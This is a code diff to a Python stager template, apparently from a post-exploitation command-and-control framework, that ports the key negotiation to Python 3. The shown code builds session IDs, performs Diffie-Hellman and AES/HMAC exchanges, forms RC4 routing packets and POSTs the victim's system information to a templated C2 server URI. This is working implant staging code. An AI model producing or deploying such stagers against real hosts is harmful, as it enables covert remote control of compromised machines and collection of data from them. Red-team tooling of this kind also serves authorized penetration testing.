@@ -25,10 +25,10 @@ def post_message(uri, data):
     return (urllib.request.urlopen(urllib.request.Request(uri, data, headers))).read()
 
 # generate a randomized sessionID
-sessionID = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
+sessionID = b''.join(random.choice(string.ascii_uppercase + string.digits).encode('UTF-8') for _ in range(8))
 
 # server configuration information
-stagingKey = '{{ staging_key }}'
+stagingKey = b'{{ staging_key }}'
 profile = '{{ profile }}'
 WorkingHours = '{{ working_hours }}'
 KillDate = '{{ kill_date }}'
@@ -56,8 +56,9 @@ for headerRaw in headersRaw:
         pass
 
 # stage 3 of negotiation -> client generates DH key, and POSTs HMAC(AESn(PUBc)) back to server
-clientPub = DiffieHellman()
-hmacData = aes_encrypt_then_hmac(stagingKey, str(clientPub.publicKey))
+clientPub=DiffieHellman()
+public_key = str(clientPub.publicKey).encode('UTF-8')
+hmacData=aes_encrypt_then_hmac(stagingKey,public_key)
 
 # RC4 routing packet:
 #   meta = STAGE1 (2)
@@ -81,7 +82,7 @@ key = clientPub.key
 
 # step 5 -> client POSTs HMAC(AESs([nonce+1]|sysinfo)
 postURI = server + "{{ stage_2 | default('/index.php', true) | ensureleadingslash}}"
-hmacData = aes_encrypt_then_hmac(clientPub.key, get_sysinfo(nonce=str(int(nonce)+1)))
+hmacData = aes_encrypt_then_hmac(key, get_sysinfo(nonce=str(int(nonce)+1)).encode('UTF-8'))
 
 # RC4 routing packet:
 #   sessionID = sessionID
